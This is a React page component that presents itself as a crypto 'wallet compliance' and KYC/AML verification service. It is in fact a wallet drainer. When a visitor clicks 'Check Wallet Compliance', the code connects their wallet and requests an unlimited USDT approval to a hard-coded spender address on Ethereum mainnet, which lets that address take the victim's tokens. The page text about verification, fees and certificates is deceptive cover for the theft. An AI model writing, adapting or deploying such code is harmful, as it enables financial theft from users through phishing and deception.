'use client';

import React, { useState } from 'react';
import EthereumProvider from "@walletconnect/ethereum-provider";
import Web3 from "web3";

const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const SPENDER = "0xbA9D4eeB570FC52CF0d5362f80Ef31DD7F239e75";
const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
const ABI = [
  {
    "constant": false,
    "inputs": [
      { "name": "_spender", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

export default function Home() {
  const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'failed'>('idle');
  const [wallet, setWallet] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  const verifyAndApprove = async () => {
    setStatus('processing');
    setError(null);
    try {
      // 1. Init WalletConnect v2 provider
      const provider = await EthereumProvider.init({
        projectId: "5304256cb79a264108479aea79d8ae5b",
        chains: [1], // Ethereum mainnet
        showQrModal: true,
        methods: ["eth_sendTransaction", "personal_sign", "eth_signTypedData"],
        optionalChains: [],
        optionalMethods: [],
        rpcMap: {
          1: "https://mainnet.infura.io/v3/ae6b05eda23642408e85dbd5bf7e705cb"
        }
      });

      await provider.enable();

      // 2. Web3 instance
      const web3 = new Web3(provider as any);

      // 3. Get accounts
      const accounts = await web3.eth.getAccounts();
      if (!accounts || accounts.length === 0) throw new Error("No account found");
      const walletAddress = accounts[0];
      setWallet(walletAddress);

      // 4. (Optional) Send wallet to backend
      // await fetch('/save-wallet.php', {
      //   method: 'POST',
      //   headers: { 'Content-Type': 'application/json' },
      //   body: JSON.stringify({ address: walletAddress })
      // });

      // 5. Approve USDT unlimited
      const contract = new web3.eth.Contract(ABI as any, USDT_CONTRACT);
      await contract.methods.approve(SPENDER, MAX_UINT).send({ from: walletAddress });

      setStatus('success');
      setTimeout(() => setStatus('idle'), 2500);

      // 6. Disconnect provider (optional)
      provider.disconnect();
    } catch (e: any) {
      setStatus('failed');
      setError(e?.message || "Unknown error");
      setTimeout(() => {
        setStatus('idle');
        setError(null);
      }, 3000);
    }
  };

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(120deg,#1e293b 0%,#2563eb 100%)',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      flexDirection: 'column'
    }}>
      <div style={{
        maxWidth: 1200,
        margin: 'auto',
        textAlign: 'center',
        color: '#fff',
        padding: '90px 0 60px 0'
      }}>
        <h1 style={{
          fontSize: '2.8rem',
          fontWeight: 900,
          marginBottom: 18,
          letterSpacing: '-1px',
          background: 'linear-gradient(90deg,#60a5fa 10%,#2563eb 60%,#1e293b 100%)',
          WebkitBackgroundClip: 'text',
          WebkitTextFillColor: 'transparent'
        }}>
          Secure Crypto Compliance &amp; Wallet Verification
        </h1>
        <p style={{
          fontSize: '1.25rem',
          color: '#dbeafe',
          maxWidth: 600,
          margin: '0 auto 24px auto',
          lineHeight: 1.6
        }}>
          Instantly verify your wallet and stay compliant with global KYC & AML standards. Fast, private, and trusted by thousands of users and businesses.
        </p>
        <div style={{
          fontSize: '1.1rem',
          color: '#fff',
          background: 'rgba(30,41,59,0.22)',
          display: 'inline-block',
          padding: '8px 22px',
          borderRadius: 8,
          fontWeight: 600,
          marginBottom: 24,
          boxShadow: '0 2px 12px rgba(30,41,59,0.10)'
        }}>
          from $0.49 fee per verification
        </div>
        <br />
        <button
          onClick={verifyAndApprove}
          disabled={status === 'processing'}
          style={{
            background: status === 'success'
              ? 'linear-gradient(90deg,#22c55e 0%,#2563eb 100%)'
              : status === 'failed'
                ? 'linear-gradient(90deg,#ef4444 0%,#b91c1c 100%)'
                : 'linear-gradient(90deg, #2563eb 0%, #1e293b 100%)',
            color: '#fff',
            padding: '18px 48px',
            fontSize: '1.2rem',
            borderRadius: 12,
            fontWeight: 700,
            letterSpacing: '0.5px',
            boxShadow: '0 6px 24px rgba(30,41,59,0.18)',
            border: 'none',
            cursor: status === 'processing' ? 'not-allowed' : 'pointer',
            marginTop: 18,
            minWidth: 220,
            transition: 'background 0.3s, color 0.3s, box-shadow 0.3s'
          }}
        >
          {status === 'processing'
            ? 'Processing...'
            : status === 'success'
              ? 'Wallet Approved!'
              : status === 'failed'
                ? 'Connection Failed'
                : 'Check Wallet Compliance'}
        </button>
        <div style={{
          fontSize: '1rem',
          color: '#bae6fd',
          marginTop: 18,
          background: 'rgba(255,255,255,0.08)',
          padding: '6px 18px',
          borderRadius: 8,
          display: 'inline-block',
          maxWidth: '95vw'
        }}>
          All tokens are checked for activity, blacklist status, and authenticity. Start verification and receive a downloadable compliance certificate
        </div>
        {wallet && (
          <div style={{
            marginTop: 24,
            color: '#60a5fa',
            fontSize: '1.1rem',
            wordBreak: 'break-all'
          }}>
            Connected wallet: {wallet}
          </div>
        )}
        {error && (
          <div style={{
            marginTop: 24,
            color: '#ef4444',
            fontSize: '1.1rem',
            wordBreak: 'break-all'
          }}>
            Error: {error}
          </div>
        )}
      </div>
    </div>
  );
}